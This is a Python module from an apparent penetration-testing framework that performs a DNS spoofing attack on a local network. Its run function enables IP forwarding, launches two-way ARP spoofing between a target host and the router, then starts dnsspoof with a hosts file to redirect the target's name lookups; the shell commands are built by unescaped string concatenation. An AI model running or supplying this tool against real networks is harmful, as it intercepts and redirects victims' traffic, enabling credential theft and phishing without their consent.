#        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)
import sys
from core import colors
from collections import OrderedDict
import os
import time
from core import getpath

# Info about the module
# Module's name (should be same as file's name)
name = "dns_spoof"
# Module version
version = "1.0"
# Description
desc = "dns spoof"
# Creator's github
github = "4shadoww"
# Creator's name
createdby = "4shadoww"
# Email
email = "4shadoww0@gmail.com"
# Alert user if root permissions not available (remove variable below if root permissions not needed)
needroot = 1

# List of the variables
variables = OrderedDict((
('interface', 'eth0'),
('target', '192.168.1.2'),
('router', '192.168.1.1'),
))

# Description for variables
vdesc = [
'target interface',
'target address',
'router address',
]

# Additional help notes
help_notes = colors.red+"this module will not work without dsniff!"+colors.end

# Additional notes to options
option_notes = colors.red+'remember to edit hostslist:\n'+getpath.conf()+"hosts"+colors.end

mhelp = OrderedDict((
('stop', 'end dnsspoof'),
))

customcommands = (
	'stop',

)

#simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	hostslist = getpath.conf()+"hosts"
	print(colors.blue+"ipv4 forwarding..."+colors.end)
	os.system('echo "1" >> /proc/sys/net/ipv4/ip_forward')
	print(colors.blue+"starting arp spoof..."+colors.end)
	xterm1 = "xterm -e arpspoof -i "+ variables['interface']+ " -t "+ variables['target']+ " "+ variables['router'] + " &"
	xterm2 = "xterm -e arpspoof -i "+ variables['interface']+ " -t "+ variables['router']+ " "+ variables['target'] + " &"
	os.system(xterm1)
	os.system(xterm2)
	print(colors.blue+"waiting for arp spoof..."+colors.end)
	time.sleep(5)
	print(colors.blue+"starting dns spoof..."+colors.end)
	xterm3 = "xterm -e dnsspoof -i "+ variables['interface']+ " -f "+ hostslist + " host " + variables['target']+ " &"
	os.system(xterm3)
	print(colors.blue+'use "stop" command to end'+colors.end)

def stop():
	os.system("killall arpspoof")
	os.system("killall dnsspoof")